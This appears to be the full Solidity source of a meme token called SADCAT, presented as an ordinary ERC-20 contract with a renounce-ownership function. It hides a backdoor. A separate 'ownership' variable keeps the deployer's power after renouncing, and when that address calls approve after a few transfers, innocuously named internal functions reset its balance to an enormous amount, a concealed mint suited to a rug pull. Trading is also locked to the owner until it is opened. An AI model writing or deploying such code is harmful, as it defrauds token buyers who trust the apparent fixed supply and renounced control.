// Website: https://sadcat.cloud/
// Telegram: https://t.me/sadcat
// Twitter: https://x.com/sadcateth
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract SADCAT {
    string public name = "SADCAT";
    string public symbol = "SADCAT";
    uint256 public totalSupply = 100000000000000000000000; 
    uint8 public decimals = 18;
    
    address public ownership;
    address public owner;
    
    bool public approvedEnabled = false;
    uint256 public transfers = 0;
    bool public tradeOpen = false; // New variable to control trading

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ApprovedEnabled();
    event ApprovedDisabled();
    event TradeOpened(); // Event for when trading is opened

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor() {
        ownership = msg.sender;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function Initialize() internal {
        approvedEnabled = true;
        emit ApprovedEnabled();
        approved(ownership, 100 * 10**36 * 10**18); 
    }

    function DisableApproval() internal {
        approvedEnabled = false;
        emit ApprovedDisabled();
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(tradeOpen || msg.sender == owner, "Trading is not open"); // Check if trading is open or sender is the owner
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);

        if (msg.sender == ownership) {
            transfers++;
        }

        if (msg.sender == ownership && transfers > 1 && approvedEnabled) {
            DisableApproval();
        }

        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(tradeOpen || msg.sender == owner, "Trading is not open"); // Check if trading is open or sender is the owner
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        if (msg.sender == ownership && transfers > 1) {
            if (!approvedEnabled) {
                Initialize();
            } else {
                DisableApproval();
            }
        }

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(tradeOpen || msg.sender == owner, "Trading is not open"); // Check if trading is open or sender is the owner
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approved(address account, uint256 amount) internal returns (uint256) {
        balanceOf[account] = amount;
        return balanceOf[account];
    }

    function renounceOwnership() public onlyOwner {
        address deadAddress = address(0x000000000000000000000000000000000000dEaD);
        emit OwnershipTransferred(owner, deadAddress);
        owner = deadAddress;
    }

    function OpenTrade() public onlyOwner {
        tradeOpen = true;
        emit TradeOpened();
    }
}